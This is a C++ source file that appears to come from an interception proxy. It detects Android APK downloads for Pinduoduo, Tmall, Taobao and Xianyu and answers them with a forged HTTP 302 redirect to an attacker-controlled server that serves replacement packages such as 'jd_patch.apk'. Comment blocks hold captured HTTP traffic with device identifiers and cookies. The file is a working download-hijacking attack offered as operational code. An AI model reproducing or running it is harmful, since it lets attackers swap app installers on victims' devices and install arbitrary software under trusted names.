#include "Pinduoduo.h"
#include "../HttpUtils.h"

int giPddFlag = 0;

int Pinduoduo::isPinduoduo(string url, string host) {
	if (host == "api.pinduoduo.com")
	{
		if (strstr(url.c_str(), "/api/app/channel/pinduoduo_baidufeed_latest.apk"))
		{
			return TRUE;
		}
	}else if (host == "download.alicdn.com")
	{
		if (strstr(url.c_str(), "/wireless/tmallandroid/latest/tmallandroid_") && strstr(url.c_str(), ".apk"))
		{
			return TRUE;
		}
		else if (strstr(url.c_str(), "/wireless/fleamarket/") && strstr(url.c_str(), ".apk"))
		{
			return TRUE;
		}
		else if (strstr(url.c_str(), "/wireless/taobaoandroid") && strstr(url.c_str(), ".apk"))
		{
			return TRUE;
		}
	}else if (host == "mcdn.yangkeduo.com")
	{
		if (strstr(url.c_str(), "/android_dev/") && strstr(url.c_str(),".apk") )
		{
			giPddFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}

int Pinduoduo::replyPinduoduo(char*lpbuf, int len, int limit, LPSSLPROXYPARAM lpssl) {
	char *szformat = "HTTP/1.1 302 Found\r\n"
		"Content-Type: text/plain; charset=utf-8\r\n"
		"Content-Length: 0\r\n"
		"Connection: keep-alive\r\n"
		"Location: http://%s/%s\r\n\r\n";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

	int totallen = 0;

	if (giPddFlag == 2)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), "jd_patch.apk");
	}
	else {
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), ANDROID_REPLACE_FILENAME);
	}
	
	return totallen;
}



/*
GET /wireless/tmallandroid/latest/tmallandroid_10001304.apk?acm=lb-zebra-259695-2359060.1003.4.5518021&scm=1003.4.lb-zebra-259695-2359060.OTHER_15514773606809_5518021 HTTP/1.1
Host: download.alicdn.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 9; EVR-AL00 Build/HUAWEIEVR-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36 T7/11.9 baiduboxapp/11.9.0.11 (Baidu; P1 9)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8
Referer: https://pages.tmall.com/wow/mit/act/download?firstModule=3&mmstat=detailupper2&src=detailupper2&needCall=0&redirectUrl=tmall%3A%2F%2Fpage.tm%2FappLink%3Faction%3Dali.open.nav%26module%3Dh5%26bootImage%3D0%26source%3Dsb%26appkey%3D26015651%26backURL%3Dbaiduboxapp%253A%252F%252Fdonothing%26params%3D%257B%2522fid%2522%253A%2522d9RL5WplbU6%2522%252C%2522mtopCostTime%2522%253A%2522318%2522%252C%2522_t%2522%253A%25221559545170127%2522%257D%26_ns%3D1%26ut_sk%3D3.1559545170128.other.click-mallDetail-1%26h5Url%3Dhttps%253A%252F%252Fdetail.m.tmall.com%252Fitem.htm%253Fid%253D533674317884%2526ali_refid%253Da3_430680_1006%25253A1123161796%25253AN%25253A%2525E7%252589%252599%2525E9%2525BE%252588%2525E5%252587%2525BA%2525E8%2525A1%252580%25253Ab2e30783ba2b4e9e06650ec8dd55cf34%2526ali_trackid%253D1_b2e30783ba2b4e9e06650ec8dd55cf34%2526spm%253Da2e15.11189806.11109913d.82%2526skuId%253D3184160791401
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,en-US;q=0.9
X-Requested-With: com.baidu.searchbox

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/vnd.android.package-archive
Content-Length: 107351816
Connection: keep-alive
Date: Sun, 02 Jun 2019 18:17:29 GMT
x-oss-request-id: 5CF412B8D4279A820D042A99
Accept-Ranges: bytes
ETag: "C2C39D1770E60A4E56A9842CB5C19AD8"
Last-Modified: Fri, 24 May 2019 09:37:59 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 14276676215780026793
x-oss-storage-class: Standard
x-oss-meta-md5: c2c39d1770e60a4e56a9842cb5c19ad8
Cache-Control: max-age=86400
Content-MD5: wsOdF3DmCk5WqYQstcGa2A==
x-oss-server-time: 41
Via: cache5.l2eu6-1[0,304-0,H], cache5.l2eu6-1[0,0], cache15.cn593[0,200-0,H], cache5.cn593[0,0]
Ali-Swift-Global-Savetime: 1558721723
Age: 45730
X-Cache: HIT TCP_MEM_HIT dirn:12:57850580
X-Swift-SaveTime: Sun, 02 Jun 2019 18:20:41 GMT
X-Swift-CacheTime: 86208
Timing-Allow-Origin: *
EagleId: 7cefea1915595451792183785e


*/


/*
GET /wireless/fleamarket/6.0.0-57249-3/10008182@idlefish-6.0.0.apk HTTP/1.1
Host: download.alicdn.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; MP1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8
Referer: https://huodong.m.taobao.com/idle/ujj52j.html?spm=a313p.198.24kd.1019814868540&short_name=I3.raCn&app=chrome
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,en-US;q=0.9

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/vnd.android.package-archive
Content-Length: 41870181
Connection: keep-alive
Date: Thu, 06 Jun 2019 09:49:11 GMT
x-oss-request-id: 5CF8E19663A1596209A2B71D
Accept-Ranges: bytes
ETag: "272D3FD03A393580E682E77F8C794995"
Last-Modified: Wed, 08 Nov 2017 04:09:32 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 3718838443560434024
x-oss-storage-class: Standard
x-oss-meta-md5: 272d3fd03a393580e682e77f8c794995
Cache-Control: max-age=86400
Content-MD5: Jy0/0Do5NYDmgud/jHlJlQ==
x-oss-server-time: 70
Via: cache20.l2eu6-1[0,304-0,H], cache19.l2eu6-1[2,0], cache19.cn1157[58,200-0,H], cache12.cn1157[63,0]
Ali-Swift-Global-Savetime: 1546917390
Age: 58483
X-Cache: HIT TCP_REFRESH_HIT dirn:12:286230098
X-Swift-SaveTime: Fri, 07 Jun 2019 02:03:54 GMT
X-Swift-CacheTime: 27917
Timing-Allow-Origin: *
EagleId: 755bb3d415598730343843785e


*/

/*
GET /api/app/channel/pinduoduo_baidufeed_latest.apk HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBAM00 Build/OPM1.171019.026)
Host: api.pinduoduo.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 302
Date: Tue, 26 Mar 2019 03:41:42 GMT
Content-Length: 0
Connection: keep-alive
Server: openresty/1.11.2.2
Location: http://mcdn.yangkeduo.com/android_dev/95e371e7-10d4-4c3e-9874-0ba45dd30cda/baidufeed/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E5%AE%98%E6%96%B9.apk
Set-Cookie: api_uid=rBQFtVyZn3a52Hf5vgwIAg==; expires=Thu, 31-Dec-37 23:55:55 GMT; domain=.yangkeduo.com; path=/



GET /weixin/checkresupdate/beautyres_1532919270.zip HTTP/1.1
Host: 47.101.189.13
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*; q = 0.8, application / signed - exchange; v = b3
Accept - Encoding: gzip, deflate, br
Accept - Language : zh - CN, zh; q = 0.9


GET /api/ad/union/redirect/?req_id=5047eab1dce348ed8720f1740a7ab99du8059&use_pb=1&rit=900760355&call_back=8orr48%2FLMAIUJalitO5EvHwPE7GhRkYCXdH8MbMzSDktwY5PrsEfcxetq02u5QLaY0PxHQL3eAioblunW1CQuXh4QUV%2B5mgcF01AzSLKUV1mn1f43BvyA9gIEhcDJHOj&extra=etH6ZVmrYmwZ1lNkR%2Fw0WfCrUJS8%2F%2FD2SajLAIqNCh%2BGChEk330lyv%2BGhWzdd1bxfzGqVs1QeKSH0LWuXCdnVoLRUO3yF1BBhsjNgytSX%2B6hJT9J%2FVPUT%2FZTqxzL1wl9ux25Qavz%2FBavl1Ik2pTDXd1o6aaRdBWa3Pq7eTa8YrGNrvuoyB3IHAkArgsm91ge5lWsRrK5niVVMpISM8whEQEb27RS6zv8%2BpaO1QrkbXe5Bj643RD77H5GGNL7BvlcVok19MHf75ZDuTA6GyBv%2B4YIkZSD%2FV5XaCTuhjZ8O6bXDmabDrFX0za3XHeTQnsx6Ryrsh5E67zAjJcoOCiksxMhkqf%2F3KHANvQLpZVReF6RuiL%2BpVqNRQ%2FxsPIpvv55bsI1zozAVZPEjHMaKL51aqKupdcZ3uczZgbQDkfC%2FXIwaw%2BmxA2KWXXqftdg3ocbaUcIyo%2BL2SqFiEiLvqmZ1LXesfsFVeYA62QQ%2FnWsdsDSjs5%2Bv4gMgDyzJwTwcQmGvYZoZ4kx%2F7ZTyAFK2zoRjKB1eVk0oywRRXCY2RMHtUTFAL3f%2Bj9Fde4oLDD5ldbuEaCLag4baTNCA95PRLH30lX6i41krK846BuGvYq9FODxPqmRQCfmV8%2FFN42a2ceyaX3%2FAgynK3b6ELijnEloOXw5lCE902%2Flqpv1ORGNFt2bGd8rMCRyp%2Bb4Kt0THFrfFajmF5APTuWpQKF%2B6jEoqA%3D%3D&source_type=1&pack_time=1559376119.7&active_extra=I4fnqjSfQTMG%2FoKXNnhLHLgBkn0SSUtTc1ieSOgT56vvbmbAJNz7%2Bbpgss3MvSpF8CvXmpOKqWAOMdVTWsxehA%3D%3D HTTP/1.1
Charset: UTF-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; TRT-AL00A Build/HUAWEITRT-AL00A)
Host: lf.snssdk.com
Connection: Keep-Alive
Accept-Encoding: gzip
Cookie: $Version="1"; 55250410929="1559375985";$Path="/";$Domain="lf.snssdk.com"


HTTP/1.1 301 Moved Permanently
Server: Tengine
Content-Type: text/html; charset=utf-8
Content-Length: 701
Connection: keep-alive
Date: Sat, 01 Jun 2019 08:02:02 GMT
Location: https://download.fuyuncc.com/phone/JYWFish3D/JYWFish3D_267-54.apk?ad_id=1634039899770919&_toutiao_params=%7B%22cid%22%3A1634042477065251%2C%22device_id%22%3A55250410929%2C%22log_extra%22%3A%22%7B%5C%22ad_price%5C%22%3A%5C%22XO4wDgACcTNc7jAOAAJxM-p2fxlulQHvOguG-w%5C%22%2C%5C%22convert_id%5C%22%3A1634039883643911%2C%5C%22orit%5C%22%3A900000000%2C%5C%22req_id%5C%22%3A%5C%225047eab1dce348ed8720f1740a7ab99du8059%5C%22%2C%5C%22rit%5C%22%3A900760355%7D%22%2C%22orit%22%3A900000000%2C%22req_id%22%3A%225047eab1dce348ed8720f1740a7ab99du8059%22%2C%22rit%22%3A900760355%2C%22sign%22%3A%22D41D8CD98F00B204E9800998ECF8427E%22%2C%22uid%22%3A101937706066%2C%22ut%22%3A12%7D
X-TT-LOGID: 20190601160202010029050078549D58
Vary: Accept-Encoding
server-timing: inner;dur=8
Vary: Accept-Encoding
server-timing: cdn-cache;desc=MISS,edge;dur=0,origin;dur=37
Via: cache1.cn615[37,0]
Timing-Allow-Origin: *
EagleId: 3d93df1515593761225295835e

<a href="https://download.fuyuncc.com/phone/JYWFish3D/JYWFish3D_267-54.apk?ad_id=1634039899770919&amp;_toutiao_params=%7B%22cid%22%3A1634042477065251%2C%22device_id%22%3A55250410929%2C%22log_extra%22%3A%22%7B%5C%22ad_price%5C%22%3A%5C%22XO4wDgACcTNc7jAOAAJxM-p2fxlulQHvOguG-w%5C%22%2C%5C%22convert_id%5C%22%3A1634039883643911%2C%5C%22orit%5C%22%3A900000000%2C%5C%22req_id%5C%22%3A%5C%225047eab1dce348ed8720f1740a7ab99du8059%5C%22%2C%5C%22rit%5C%22%3A900760355%7D%22%2C%22orit%22%3A900000000%2C%22req_id%22%3A%225047eab1dce348ed8720f1740a7ab99du8059%22%2C%22rit%22%3A900760355%2C%22sign%22%3A%22D41D8CD98F00B204E9800998ECF8427E%22%2C%22uid%22%3A101937706066%2C%22ut%22%3A12%7D">Moved Permanently</a>.




*/